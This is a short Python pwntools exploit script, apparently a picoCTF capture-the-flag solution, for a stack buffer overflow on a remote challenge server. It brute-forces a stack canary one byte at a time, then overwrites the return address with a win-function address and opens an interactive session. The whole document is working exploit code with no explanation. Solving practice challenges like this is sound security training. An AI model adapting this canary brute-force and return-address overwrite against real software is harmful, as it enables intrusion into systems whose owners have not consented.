from pwn import *
# adapted from https://tcode2k16.github.io/blog/posts/picoctf-2018-writeup/binary-exploitation/#buffer-overflow-3
# context.log_level = 'debug'

winAddr = 0x08049336

canary = ''
for i in range(1, 5):
  for e in range(256):
    sh = remote("saturn.picoctf.net", 58278)
    sh.sendlineafter('> ', str(64+i))
    sh.sendafter('> ', 'a'.encode()*64+canary.encode()+chr(e).encode())
    output = sh.recvall()
    if 'Stack' not in output.decode():
      print(output.decode())
      canary += chr(e)
      break
print(canary)

# canary = ''

sh = remote("saturn.picoctf.net", 58278)
sh.sendlineafter('> ', str(200))
sh.sendlineafter('> ', 'a'.encode()*64+canary.encode()+'a'.encode()*16+p32(winAddr))
sh.interactive()
